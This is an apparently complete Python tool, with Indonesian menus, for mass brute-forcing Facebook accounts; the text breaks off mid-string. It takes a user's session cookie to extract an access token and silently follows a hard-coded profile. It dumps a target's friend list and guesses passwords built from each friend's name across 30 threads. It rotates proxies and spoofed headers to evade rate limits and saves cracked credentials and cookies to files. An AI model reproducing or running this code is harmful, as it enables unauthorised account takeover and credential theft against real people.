#<-[ Bahan-Bahan-Kebutuhan-Maling ]->#
import requests,bs4,json,os,sys,random,datetime,time,re,rich
from concurrent.futures import ThreadPoolExecutor as tred
from bs4 import BeautifulSoup as parser
from rich.console import Console

#<-[ Global-Name ]->#
id, id2 =  [], []
ualu, ualuh = [], []
pwpluss, pwnya = [], []
tokenku, method = [], []
loop, ok, cp = 0, 0, 0
ses = requests.Session()
sys.stdout.write('\x1b]2; Brute Force Facebook Free By Niaw.MXV\x07')

#<-[ Generator-Proksi ]->#
try:
	prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=80000&country=all&ssl=all&anonymity=all').text
	open('.prox.txt','w').write(prox)
except Exception as e:
	print('[\x1b[1;92m•\x1b[1;97m] [\x1b[1;96mTIDAK ADA KONEKSI INTERNET !')
prox=open('.prox.txt','r').read().splitlines()

#<-[ Pewarna ]->#
rc=random.choice
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m' 
N = '\x1b[0m'    
X = rc([
	M,H,U,B,K,P
	])

#<-[ Konversi-Data-Waktu ]->#
dic = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'August','9':'September','10':'October','11':'November','12':'December'}
tgl = datetime.datetime.now().day
bln = dic[(str(datetime.datetime.now().month))]
thn = datetime.datetime.now().year
okc = 'OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
cpc = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'

#<-[ Animasi-Print ]->#
def _____animasi__berjalan_____(u):
        for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.005)

#<-[ Clear-Layar ]->#
def BersihkanLayar(): os.system("cls" if os.name == "nt" else "clear")

#<-[ Hapus-Cokies ]->#
def Kaluar(): os.system('rm -rf .token.txt');os.system('rm -rf .cok.txt');_____animasi__berjalan_____(f'{X} => {P}Berhasil Keluar \x1b[1;9m+\x1b[1;91m Hapus Cookie ');exit()

#<-[ Kembali-Kemenu ]->#
def KembaliKeLaptop(): MainMenu()

#<-[ Logo-Banener ]->#
def LogoBanner(): BersihkanLayar();_____animasi__berjalan_____(f'''\x1b[1;91m<------------------------------------------------------------>{X}\n  ██████╗██████╗  █████╗  ██████╗██╗  ██╗    ███████╗██████╗\n ██╔════╝██╔══██╗██╔══██╗██╔════╝██║ ██╔╝    ██╔════╝██╔══██╗\n ██║     ██████╔╝███████║██║     █████╔╝     █████╗  ██████╔╝\n ██║     ██╔══██╗██╔══██║██║     ██╔═██╗     ██╔══╝  ██╔══██╗\n ╚██████╗██║  ██║██║  ██║╚██████╗██║  ██╗    ██║     ██████╔╝\n  ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝    ╚═╝     ╚═════╝\n\x1b[1;91m<------------------------------------------------------------>{N}''')

#<-[ Login-Cookies ]->#
def LoginCookies():
	BersihkanLayar();LogoBanner();_____animasi__berjalan_____(f'{X} => {P}Masukan Tumbal Cookies Facebook Anda Yang Masih Perawan !');_____animasi__berjalan_____(f'{M}<------------------------------------------------------------>')
	cok = input(f'{X} => {X}')
	try:
		head = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36"}
		link = ses.get("https://web.facebook.com/adsmanager?_rdc=1&_rdr", headers=head, cookies={"cookie": cok})
		find = re.findall('act=(.*?)&nav_source', link.text)
		if len(find) == 0:_____animasi__berjalan_____(f'{X} => {P}Cookie Kamu Invalid, Ganti Cookie Lain!');time.sleep(2);LoginCookies()
		else:
			for x in find:
				xz = ses.get(f"https://web.facebook.com/adsmanager/manage/campaigns?act={x}&nav_source=no_referrer", headers = head, cookies={"cookie": cok})
				took = re.search('(EAAB\w+)',xz.text).group(1)
				tokenw = open(".token.txt", "w").write(took)
				cokiew = open(".cok.txt", "w").write(cok)
				_____animasi__berjalan_____(f'{M}<------------------------------------------------------------>');_____animasi__berjalan_____(f'{X} => {P}Token EAAB Tumbal Cookies Facebook Anda');_____animasi__berjalan_____(f'{M}<------------------------------------------------------------>');_____animasi__berjalan_____(f'{X} => {P}{X}{took}');_____animasi__berjalan_____(f'{M}<------------------------------------------------------------>');_____animasi__berjalan_____(f'{X} => {P}Login Tumbal Cookies Facebook Anda Telah Berhasil !{N}');_____animasi__berjalan_____(f'{M}<------------------------------------------------------------>');follow_atuh();exit()
	except Exception as e:exit(e)
def follow_atuh():	
	try:cok = open('.cok.txt','r').read()
	except IOError:_____animasi__berjalan_____(f'{X} => {P}Cookies Anda Kadaluarsa');time.sleep(5);NgecekCookies()
	try:
		for foll in parser(requests.get(f'https://mbasic.facebook.com/100083788721465',cookies={'cookie':cok}).text,'html.parser').find_all('a',href=True):
			if '/a/subscribe.php?' in foll.get('href'):
				x=requests.get('https://mbasic.facebook.com'+foll['href'],cookies = {'cookie':cok}).text;exit()
	except(Exception)as e:print(e)#< Response error
	
#<-[ Main-Menu ]->#
def MainMenu():
	BersihkanLayar();LogoBanner()
	try:token = open('.token.txt','r').read();cok = open('.cok.txt','r').read();tokenku.append(token)
	except (IOError, KeyError, FileNotFoundError):_____animasi__berjalan_____(f'{X} => {P} Cookies Anda Invalid');time.sleep(3);LoginCookies()
	try:
		data_fb = requests.get('https://graph.facebook.com/me?fields=id,name&access_token='+tokenku[0], cookies={'cookie':cok})
		my_name = json.loads(data_fb.text)['name']
		my_uidz = json.loads(data_fb.text)['id']
	except requests.exceptions.ConnectionError:
		_____animasi__berjalan_____(f'{X} => {P}Error Tidak Ada Koneksi Internet Periksa Dan Coba Lagi !');exit()
	except KeyError:
		try:os.system('rm -rf .token.txt');os.system('rm -rf .cok.txt');LoginCookies()
		except:pass
	except IOError:
		LoginCookies()
	Console(width=62).print(f'[bol white][under_line]Tumbal Facebook Anda Login Sebagai : {my_name}',justify='center')
	_____animasi__berjalan_____(f'{M}<------------------------------------------------------------>')
	_____animasi__berjalan_____(f'{X} => {P}01. Crack Publik \33[m ')
	_____animasi__berjalan_____(f'{X} => {P}02. Chrck Result \33[m ')
	_____animasi__berjalan_____(f'{X} => {P}00.\x1b[1;9m \x1b[1;91mHapus Cookie \33[m ')
	_____xhoniaw__emexvi_____ = input(f'{X} => {X}')
	if   _____xhoniaw__emexvi_____ in ['01','1']: _____animasi__berjalan_____(f'{M}<------------------------------------------------------------>');idt = input(f'{X} => {P}Target : ');dump(idt,"",{"cookie":cok},token);setting()
	elif _____xhoniaw__emexvi_____ in ['02','2']: Result()
	elif _____xhoniaw__emexvi_____ in ['00','0']: Kaluar()
	else:_____animasi__berjalan_____(f'{X} => {P}Pilih Yang Bener Kak !');time.sleep(3);KembaliKeLaptop()

#<-[ Chek-Result ]->#
def Result():
	_____animasi__berjalan_____(f'{M}<------------------------------------------------------------>')
	_____animasi__berjalan_____(f'{X} => {P}01. Hasil Akun \33[m(\x1b[1;93mCP\33[m) ')
	_____animasi__berjalan_____(f'{X} => {P}02. Hasil Akun \33[m(\x1b[1;92mOK\33[m) ')
	_____animasi__berjalan_____(f'{X} => {P}00. Kembali')
	kz = input(f'{X} => {X}')
	if kz in ['1','01']:
		_____animasi__berjalan_____(f'{M}<------------------------------------------------------------>{N}')
		try:vin = os.listdir('CP')
		except FileNotFoundError:_____animasi__berjalan_____(f'{X} => {P}File Tidak Di Temukan ! ');time.sleep(3);KembaliKeLaptop()
		if len(vin)==0:_____animasi__berjalan_____(f'{X} => {P}Anda Tidak Memiliki Hasil CP ');time.sleep(2);KembaliKeLaptop()
		else:
			cih = 0
			lol = {}
			for isi in vin:
				try:hem = open('CP/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<10:
					nom = ' ➛ '+str(cih)
					lol.update({str(cih):str(isi)})
					lol.update({nom:str(isi)})
					print(''+nom+'. '+isi+'\x1b[1;91m '+str(len(hem))+' \033[0mAccount '+N)
				else:
					lol.update({str(cih):str(isi)})
					print(''+str(cih)+'. '+isi+'\x1b[1;91m '+str(len(hem))+' \033[0mAccount '+N)
			_____animasi__berjalan_____(f'{M}<------------------------------------------------------------>{N}')
			geeh = input(f'{X} => ')
			try:geh = lol[geeh]
			except KeyError:_____animasi__berjalan_____(f'{X} => {P}Pilih Yang Bener Kak ');exit()
			try:lin = open('CP/'+geh,'r').read().splitlines()
			except:_____animasi__berjalan_____(f'{X} => {P}File Tidak Di Temukan ');time.sleep(2);KembaliKeLaptop()
			nocp=0
			for cpku in range(len(lin)):
				cpkuni=lin[nocp].split('|')
				print(f'{X} => {M}{cpkuni[0]}|{cpkuni[1]}{N}')
				nocp +=1
			_____animasi__berjalan_____(f'{M}<------------------------------------------------------------>{N}')
			input(f'{X} => {P}Klik Enter ');KembaliKeLaptop()
	elif kz in ['2','02']:
		_____animasi__berjalan_____(f'{M}<------------------------------------------------------------>{N}')
		try:vin = os.listdir('OK')
		except FileNotFoundError:_____animasi__berjalan_____(f'{X} => {P}File Tidak Di Temukan ');time.sleep(2);KembaliKeLaptop()
		if len(vin)==0:_____animasi__berjalan_____(f'{X} => {P}Anda Tidak Mempunyai File OK ');time.sleep(2);KembaliKeLaptop()
		else:
			cih = 0
			lol = {}
			for isi in vin:
				try:hem = open('OK/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<100:
					nom = ' ➛ '+str(cih)
					lol.update({str(cih):str(isi)})
					lol.update({nom:str(isi)})
					print(''+nom+'. '+isi+'\x1b[1;92m '+str(len(hem))+' \033[0mAccount '+N)
				else:
					lol.update({str(cih):str(isi)})
					print(''+str(cih)+'. '+isi+'\x1b[1;92m '+str(len(hem))+' \033[0mAccount '+N)
			_____animasi__berjalan_____(f'{M}<------------------------------------------------------------>{N}')
			geeh = input(f'{X} => {M}')
			try:geh = lol[geeh]
			except KeyError:_____animasi__berjalan_____(f'{X} => {P}Pilih Yang Bener Kak ! ');exit()
			try:lin = open('OK/'+geh,'r').read().splitlines()
			except:_____animasi__berjalan_____(f'{X} => {P}File Tidak Di Temukan !');time.sleep(2);KembaliKeLaptop()
			nocp=0
			for cpku in range(len(lin)):
				cpkuni=lin[nocp].split('|')
				print(f'{X} => {H}{cpkuni[0]}|{cpkuni[1]}|{cpkuni[2]}{N}')
				nocp +=1
			_____animasi__berjalan_____(f'{M}<------------------------------------------------------------>{N}')
			input(f'{X} => {P}Klik Enter ');KembaliKeLaptop()
	elif kz in ['0','00']:KembaliKeLaptop()
	else:_____animasi__berjalan_____(f'{X} => {P}Pilih Yang Bener Kak !');exit()

#<-[ Dump-Id-Publik ]->#
def dump(idt,fields,cookie,token):
	try:
		headers = {
			"connection": "keep-alive", 
			"accept": "*/*", 
			"sec-fetch-dest": "empty", 
			"sec-fetch-mode": "cors",
			"sec-fetch-site": "same-origin", 
			"sec-fetch-user": "?1",
			"sec-ch-ua-mobile": "?1",
			"upgrade-insecure-requests": "1", 
			"user-agent": "Mozilla/5.0 (Linux; Android 11; AC2003) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36",
			"accept-encoding": "gzip, deflate",
			"accept-language": "id-ID,id;q=0.9"
		}
		if len(id) == 0:
			params = {
				"access_token": token,
				"fields": f"name,friends.fields(id,name,birthday)"
			}
		else:
			params = {
				"access_token": token,
				"fields": f"name,friends.fields(id,name,birthday).after({fields})"
			}
		url = ses.get(f"https://graph.facebook.com/{idt}",params=params,headers=headers,cookies=cookie).json()
		for i in url["friends"]["data"]:
			id.append(i["id"]+"|"+i["name"])
			sys.stdout.write(f"\r{X} => {P}Jumlah : {len(id)} Id Sukses!{P}"),
			sys.stdout.flush()
		dump(idt,url["friends"]["paging"]["cursors"]["after"],cookie,token)
	except:pass

#<-[ Set-Urutan-Id ]->#
def setting():
	_____animasi__berjalan_____('\n\x1b[1;91m<------------------------------------------------------------>')
	_____animasi__berjalan_____(f'{X} => {P}01. Akun Old ')
	_____animasi__berjalan_____(f'{X} => {P}02. Akun New ')
	_____animasi__berjalan_____(f'{X} => {P}03. Random ')
	urutan_id = input(f'{X} => {X}')
	if urutan_id in ['1','01']:
		for tua in sorted(id):
			id2.append(tua)
	elif urutan_id in ['2','02']:
		muda=[]
		for bacot in sorted(id):
			muda.append(bacot)
		bcm=len(muda)
		bcmi=(bcm-1)
		for xmud in range(bcm):
			id2.append(muda[bcmi])
			bcmi -=1
	elif urutan_id in ['3','03']:
		for bacot in id:
			xx = random.randint(0,len(id2))
			id2.insert(xx,bacot)
	else:_____animasi__berjalan_____(f'{X} => {P}Pilih Yang Bener Kak !');exit()

#<-[ Set-Metod ]->#
	_____animasi__berjalan_____(f'{M}<------------------------------------------------------------>')
	_____animasi__berjalan_____(f'{X} => {P}01. Bisnis \33[m(\x1b[1;93mbusiness.facebook.com\33[m) \33[m---->\x1b[1;97m Regular\33[m ')
	_____animasi__berjalan_____(f'{X} => {P}02. ProdV1 \33[m(\x1b[1;93mm/free.prod.facebook.com\33[m) \33[m->\x1b[1;97m Validate\33[m ')
	_____animasi__berjalan_____(f'{X} => {P}03. ProdV2 \33[m(\x1b[1;93mfree.prod.facebook.com\33[m) \33[m--->\x1b[1;97m Async\33[m ')
	method_ny = input(f'{X} => {X}')
	if   method_ny in ['1','01']:method.append('bisnis')
	elif method_ny in ['2','02']:method.append('prodv1')
	elif method_ny in ['3','03']:method.append('prodv2')
	else:method.append('bisnis')

#<-[ Set-Pw-Manual ]->#
	_____animasi__berjalan_____(f'{M}<------------------------------------------------------------>')
	pwplus=input(f'{X} => {P}Tambahkan Password Manual ? \33[m( \x1b[1;92mY\x1b[1;91m/\x1b[1;93mt \33[m) ')
	if pwplus in ['y','Y']:
		pwpluss.append('ya')
		pwku=input(f'{X} => {X}')
		pwkuh=pwku.split(',')
		for xpw in pwkuh:
			pwnya.append(xpw)
	else:pwpluss.append('tidak')

#<-[ Set-Ua-Manual ]->#
	uatambah = input(f'{X} => {P}Gunakan User-Agent Manual ? \33[m( \x1b[1;92mY\x1b[1;91m/\x1b[1;93mT \33[m) ')
	if uatambah in ['y','Ya','ya','Y']:
		ualuh.append('ya')
		bzer = input(f'{X} => {X}')
		ualu.append(bzer)
	else:ualuh.append('tidak')
	passwrd()

#<-[ Kata-Sandi ]->#
def passwrd():
	_____animasi__berjalan_____(f'{M}<------------------------------------------------------------>')
	_____animasi__berjalan_____(f'{P} => Mainkan Mode Pesawat Setiap 300ID Agar Antisipasi Spam IP')
	_____animasi__berjalan_____(f'{M}<------------------------------------------------------------>')
	with tred(max_workers=30) as pool:
		for yuzong in id2:
			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
			frs = nmf.split(' ')[0]
			pwv = ['kamu nanya','kamunanya','kata sandi']
			if len(nmf)<6:
				if len(frs)<3:
					pass
				else:
					pwv.append(nmf)
					pwv.append(frs+'123')
					pwv.append(frs+'1234')
					pwv.append(frs+'12345')
					pwv.append(frs+'123456')
			else:
				if len(frs)<3:
					pwv.append(nmf)
				else:
					pwv.append(nmf)
					pwv.append(frs+'123')
					pwv.append(frs+'1234')
					pwv.append(frs+'12345')
					pwv.append(frs+'123456')
			if 'ya' in pwpluss:
				for xpwd in pwnya:
					pwv.append(xpwd)
			else:pass
			if   'bisnis' in method:pool.submit(crack1,idf,pwv,nmf)
			elif 'prodv1' in method:pool.submit(crack2,idf,pwv,nmf)
			elif 'prodv2' in method:pool.submit(crack3,idf,pwv,nmf)
			else:pool.submit(crack1,idf,pwv,nmf)
	print('\r')
	_____animasi__berjalan_____(f'{M}<------------------------------------------------------------>')
	_____animasi__berjalan_____(f'{X} => {P}Crack {H}%s{P} ID Selesai, Hasil Akun OK : {H}%s{P} Dan Akun CP : {M}%s{N}'%(len(id),ok,cp))
	_____animasi__berjalan_____(f'{M}<------------------------------------------------------------>')
	
#<-[ Metod-Bisnis ]->#
def crack1(idf,pwv,nmf):
	global loop,ok,cp
	sys.stdout.write(f"\r{P} => {N}{'{:.0%}'.format(loop/float(len(id)))} {(loop)}={len(id)} {idf} {H}{(ok)}{N}={M}{(cp)}{N} "),sys.stdout.flush()
	ua = Ugen()
	ses = requests.Session()
	for pw in pwv:
		try:
			if 'ya' in ualuh: ua = ualu[0]
			nip=random.choice(prox)
			proxs= {'http': 'socks5://'+nip}
			req1 = ses.get('https://business.facebook.com/login.php?skip_api_login=1&api_key=124024574287414&kid_directed_site=0&app_id=124024574287414&signed_next=1&next=https%3A%2F%2Fweb.facebook.com%2Fdialog%2Foauth%3Fclient_id%3D124024574287414%26locale%3Did_ID%26redirect_uri%3Dhttps%253A%252F%252Fwww.instagram.com%252Faccounts%252Fsignup%252F%26response_type%3Dcode%252Cgranted_scopes%26scope%3Demail%26state%3D%257B%2522fbLoginKey%2522%253A%25221c2p5l61dkiv87w0ntog1kqtm7h1dfscal195qzu6vmm9o975e4e6%2522%252C%2522fbLoginReturnURL%2522%253A%2522%252Ffxcal%252Fdisclosure%252F%253Fnext%253D%25252F%2522%257D%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D53f2c645-6bbd-4113-8342-3a4ac47e2c7a%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.instagram.com%2Faccounts%2Fsignup%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%2522fbLoginKey%2522%253A%25221c2p5l61dkiv87w0ntog1kqtm7h1dfscal195qzu6vmm9o975e4e6%2522%252C%2522fbLoginReturnURL%2522%253A%2522%252Ffxcal%252Fdisclosure%252F%253Fnext%253D%25252F%2522%257D%23_%3D_&display=page&locale=id_ID&pl_dbl=0').text
			data = {'jazoest':re.search('name="jazoest" value="(.*?)"',str(req1)).group(1),'lsd':re.search('name="lsd" value="(.*?)"',str(req1)).group(1),'api_key':'124024574287414','cancel_url':'https://www.instagram.com/accounts/signup/?error=access_denied&error_code=200&error_description=Permissions+error&error_reason=user_denied&state=%7B%22fbLoginKey%22%3A%221c2p5l61dkiv87w0ntog1kqtm7h1dfscal195qzu6vmm9o975e4e6%22%2C%22fbLoginReturnURL%22%3A%22%2Ffxcal%2Fdisclosure%2F%3Fnext%3D%252F%22%7D#_=_','display':'page','isprivate':'','return_session':'','skip_api_login':1,'signed_next':1,'trynum':1,'timezone':'-420','lgndim':re.search('name="lgndim" value="(.*?)"',str(req1)).group(1),'lgnrnd':re.search('name="lgnrnd" value="(.*?)"',str(req1)).group(1),'lgnjs':re.search('name="lgnjs" value="(.*?)"',str(req1)).group(1),'email':idf,'prefill_contact_point':idf,'prefill_source':'browser_dropdown','prefill_type':'password','first_prefill_source':'browser_dropdown','first_prefill_type':'contact_point','had_cp_prefilled':True,'had_password_prefilled':True,'ab_test_data':'','encpass':f"#PWD_BROWSER:0:{int(datetime.datetime.now().timestamp())}:{pw}"}
			head = {'Host': 'business.facebook.com','cache-control': 'max-age=0','content-type': 'application/x-www-form-urlencoded','user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36','accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','sec-fetch-site': 'same-origin','sec-fetch-mode': 'navigate','sec-fetch-user': '?1','sec-fetch-dest': 'document','referer': 'https://business.facebook.com/login.php?skip_api_login=1&api_key=124024574287414&kid_directed_site=0&app_id=124024574287414&signed_next=1&next=https%3A%2F%2Fweb.facebook.com%2Fdialog%2Foauth%3Fclient_id%3D124024574287414%26locale%3Did_ID%26redirect_uri%3Dhttps%253A%252F%252Fwww.instagram.com%252Faccounts%252Fsignup%252F%26response_type%3Dcode%252Cgranted_scopes%26scope%3Demail%26state%3D%257B%2522fbLoginKey%2522%253A%25221c2p5l61dkiv87w0ntog1kqtm7h1dfscal195qzu6vmm9o975e4e6%2522%252C%2522fbLoginReturnURL%2522%253A%2522%252Ffxcal%252Fdisclosure%252F%253Fnext%253D%25252F%2522%257D%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D53f2c645-6bbd-4113-8342-3a4ac47e2c7a%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.instagram.com%2Faccounts%2Fsignup%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%2522fbLoginKey%2522%253A%25221c2p5l61dkiv87w0ntog1kqtm7h1dfscal195qzu6vmm9o975e4e6%2522%252C%2522fbLoginReturnURL%2522%253A%2522%252Ffxcal%252Fdisclosure%252F%253Fnext%253D%25252F%2522%257D%23_%3D_&display=page&locale=id_ID&pl_dbl=0','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
			datr = re.search('_js_datr","(.*?)"',str(req1)).group(1)
			coki = f'datr={datr};locale=id_ID;wl_cbv=v2%3Bclient_version%3A2392%3Btimestamp%3A{int(time.time())};vpd=v1%3B885x360x2;wd=980x1715;{";".join(["%s=%s"%(x,y) for x,y in ses.cookies.get_dict().items()])};_js_datr={datr}'
			req2 = ses.post('https://business.facebook.com/login/device-based/regular/login/?login_attempt=1&next=https%3A%2F%2Fweb.facebook.com%2Fdialog%2Foauth%3Fclient_id%3D124024574287414%26locale%3Did_ID%26redirect_uri%3Dhttps%253A%252F%252Fwww.instagram.com%252Faccounts%252Fsignup%252F%26response_type%3Dcode%252Cgranted_scopes%26scope%3Demail%26state%3D%257B%2522fbLoginKey%2522%253A%25221c2p5l61dkiv87w0ntog1kqtm7h1dfscal195qzu6vmm9o975e4e6%2522%252C%2522fbLoginReturnURL%2522%253A%2522%252Ffxcal%252Fdisclosure%252F%253Fnext%253D%25252F%2522%257D%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D53f2c645-6bbd-4113-8342-3a4ac47e2c7a%26tp%3Dunspecified%26cbt%3D1705563202091&lwv=100', data=data, headers=head, cookies={'cookie':coki}, proxies=proxs, allow_redirects=False)
			if "checkpoint" in ses.cookies.get_dict().keys():
				print(f'\r{P} => {M}{idf}|{pw} => {nmf} => {tahun(idf)}{N}')
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				kuki = f'{";".join(["%s=%s"%(x,y) for x,y in ses.cookies.get_dict().items()])};_js_datr={datr}'
				print(f'\r{P} => {H}{idf}|{pw} => {nmf} => {tahun(idf)} => {kuki} => {ua}{N}')
				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'|'+ua+'\n')
				break
			else:continue
		except requests.exceptions.ConnectionError:time.sleep(31)
	loop+=1

#<-[ Metod-ProrV1 ]->#
def crack2(idf,pwv,nmf):
	global loop,ok,cp
	sys.stdout.write(f"\r{P} => {N}{'{:.0%}'.format(loop/float(len(id)))} {(loop)}={len(id)} {idf} {H}{(ok)}{N}={M}{(cp)}{N} "),sys.stdout.flush()
	url = random.choice(['free.prod.facebook.com','m.prod.facebook.com'])
	ua = Ugen()
	ses = requests.Session()
	for pw in pwv:
		try:
			if 'ya' in ualuh: ua = ualu[0]
			link = ses.get(f"https://{url}/login.php?skip_api_login=1&api_key=3213804762189845&kid_directed_site=0&app_id=3213804762189845&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv3.1%2Fdialog%2Foauth%3Fclient_id%3D3213804762189845%26redirect_uri%3Dhttps%253A%252F%252Fwww.capcut.com%252Fpassport%252Fweb%252Fweb_login_success%26scope%3Demail%26state%3D0053afca3gAToVCgoVPZIGY3NGIxZTM4YjU5Zjg5ZmNkNTkxNWUyZWZmNzMyYjQxoU7ZOmh0dHBzOi8vd3d3LmNhcGN1dC5jb20vbHYvdjEvdXNlci93ZWIvbG9naW4vdGhpcmRfY2FsbGJhY2uhVgGhSQChRAChQdIABVAcoU0AoUiud3d3LmNhcGN1dC5jb22hUgKiUEzRBuymQUNUSU9OqXVuZGVmaW5lZKFM2SJodHRwczovL3d3dy5jYXBjdXQuY29tL2lkLWlkL2xvZ2luoVTZIDJkNzg1MGFiZmFiODNjNWUxYjU2MGExODBjYzA3YzcwoVcAoUYAolNBAKFVwqJNTMI%25253D%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Daf919600-a681-4aeb-a128-05e90339859f%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.capcut.com%2Fpassport%2Fweb%2Fweb_login_success%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D0053afca3gAToVCgoVPZIGY3NGIxZTM4YjU5Zjg5ZmNkNTkxNWUyZWZmNzMyYjQxoU7ZOmh0dHBzOi8vd3d3LmNhcGN1dC5jb20vbHYvdjEvdXNlci93ZWIvbG9naW4vdGhpcmRfY2FsbGJhY2uhVgGhSQChRAChQdIABVAcoU0AoUiud3d3LmNhcGN1dC5jb22hUgKiUEzRBuymQUNUSU9OqXVuZGVmaW5lZKFM2SJodHRwczovL3d3dy5jYXBjdXQuY29tL2lkLWlkL2xvZ2luoVTZIDJkNzg1MGFiZmFiODNjNWUxYjU2MGExODBjYzA3YzcwoVcAoUYAolNBAKFVwqJNTMI%25253D%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr")
			date = (
			{
			"lsd":
			      re.search('name="lsd" value="(.*?)"', str(link.text)).group(1),
			"jazoest":
			      re.search('name="jazoest" value="(.*?)"', str(link.text)).group(1),
	        "uid":idf,
	        "next": "https://x.facebook.com/v3.1/dialog/oauth?client_id=3213804762189845&redirect_uri=https%3A%2F%2Fwww.capcut.com%2Fpassport%2Fweb%2Fweb_login_success&scope=email&state=0053afca3gAToVCgoVPZIGY3NGIxZTM4YjU5Zjg5ZmNkNTkxNWUyZWZmNzMyYjQxoU7ZOmh0dHBzOi8vd3d3LmNhcGN1dC5jb20vbHYvdjEvdXNlci93ZWIvbG9naW4vdGhpcmRfY2FsbGJhY2uhVgGhSQChRAChQdIABVAcoU0AoUiud3d3LmNhcGN1dC5jb22hUgKiUEzRBuymQUNUSU9OqXVuZGVmaW5lZKFM2SJodHRwczovL3d3dy5jYXBjdXQuY29tL2lkLWlkL2xvZ2luoVTZIDJkNzg1MGFiZmFiODNjNWUxYjU2MGExODBjYzA3YzcwoVcAoUYAolNBAKFVwqJNTMI%253D&ret=login&fbapp_pres=0&logger_id=af919600-a681-4aeb-a128-05e90339859f&tp=unspecified",
	        "flow":"login_no_pin",
	        "pass":pw,
	        } 
	    )    
			cuoz = (";").join([ "%s=%s" % (key, value) for key, value in link.cookies.get_dict().items() ])		
			head=(
		{
		'Host': url,
		'cache-control': 'max-age=0',
		'upgrade-insecure-requests': '1',
		'origin': f'https://'+url,
	     'content-type': 'application/x-www-form-urlencoded',
	     'x-requested-with': 'XMLHttpRequest',
		'user-agent': ua,
		'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
		'sec-fetch-site': 'same-origin',
	     'sec-fetch-mode': 'navigate',
	     'sec-fetch-user': '?1',
	     'sec-fetch-dest': 'document',
		'dpr': f'{str(random.randint(1,5))}',
		'viewport-width': f'{str(random.randint(300,999))}',
	     'sec-ch-ua': f'"Not)A;Brand";v="{str(random.randint(8,24))}", "Chromium";v="{str(random.randint(99,116))}"',
	     'sec-ch-ua-mobile': '?1',
	     'sec-ch-ua-platform': '"Android"',
	     'sec-ch-ua-platform-version': f'"{str(random.randint(5,14))}.0.0"',
	     'sec-ch-ua-full-version-list': f'"Not)A;Brand";v="{str(random.randint(8,24))}.0.0.0", "Chromium";v="{str(random.randint(99,120))}.0.{str(random.randint(5000,5999))}.{str(random.randint(40,150))}"',
	     'sec-ch-prefers-color-scheme': 'dark',
	     'referer': f'https://{url}/login.php?skip_api_login=1&api_key=3213804762189845&kid_directed_site=0&app_id=3213804762189845&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv3.1%2Fdialog%2Foauth%3Fclient_id%3D3213804762189845%26redirect_uri%3Dhttps%253A%252F%252Fwww.capcut.com%252Fpassport%252Fweb%252Fweb_login_success%26scope%3Demail%26state%3D0053afca3gAToVCgoVPZIGY3NGIxZTM4YjU5Zjg5ZmNkNTkxNWUyZWZmNzMyYjQxoU7ZOmh0dHBzOi8vd3d3LmNhcGN1dC5jb20vbHYvdjEvdXNlci93ZWIvbG9naW4vdGhpcmRfY2FsbGJhY2uhVgGhSQChRAChQdIABVAcoU0AoUiud3d3LmNhcGN1dC5jb22hUgKiUEzRBuymQUNUSU9OqXVuZGVmaW5lZKFM2SJodHRwczovL3d3dy5jYXBjdXQuY29tL2lkLWlkL2xvZ2luoVTZIDJkNzg1MGFiZmFiODNjNWUxYjU2MGExODBjYzA3YzcwoVcAoUYAolNBAKFVwqJNTMI%25253D%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Daf919600-a681-4aeb-a128-05e90339859f%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.capcut.com%2Fpassport%2Fweb%2Fweb_login_success%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D0053afca3gAToVCgoVPZIGY3NGIxZTM4YjU5Zjg5ZmNkNTkxNWUyZWZmNzMyYjQxoU7ZOmh0dHBzOi8vd3d3LmNhcGN1dC5jb20vbHYvdjEvdXNlci93ZWIvbG9naW4vdGhpcmRfY2FsbGJhY2uhVgGhSQChRAChQdIABVAcoU0AoUiud3d3LmNhcGN1dC5jb22hUgKiUEzRBuymQUNUSU9OqXVuZGVmaW5lZKF